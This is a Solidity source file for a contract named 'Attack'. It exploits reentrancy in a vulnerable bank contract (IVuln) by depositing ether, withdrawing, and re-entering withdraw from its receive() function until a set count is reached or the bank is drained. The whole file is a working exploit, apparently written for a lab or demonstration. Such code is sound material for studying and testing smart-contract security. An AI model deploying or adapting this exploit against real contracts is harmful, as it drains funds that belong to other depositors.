// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVuln {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attack {
    IVuln public bank;
    uint256 public step;
    uint256 public reentered;
    uint256 public maxReenters;

    constructor(address bank_) {
        bank = IVuln(bank_);
    }

    function attack(uint256 _maxReenters) external payable {
        require(msg.value > 0, "need eth");
        step = msg.value;
        maxReenters = _maxReenters;
        reentered = 0;

        bank.deposit{value: msg.value}();
        bank.withdraw(step);
    }

    receive() external payable {
        // limit reentrancy to avoid unexpected send-failed loops
        if (reentered < maxReenters && address(bank).balance >= step) {
            reentered++;
            bank.withdraw(step);
        }
    }
}
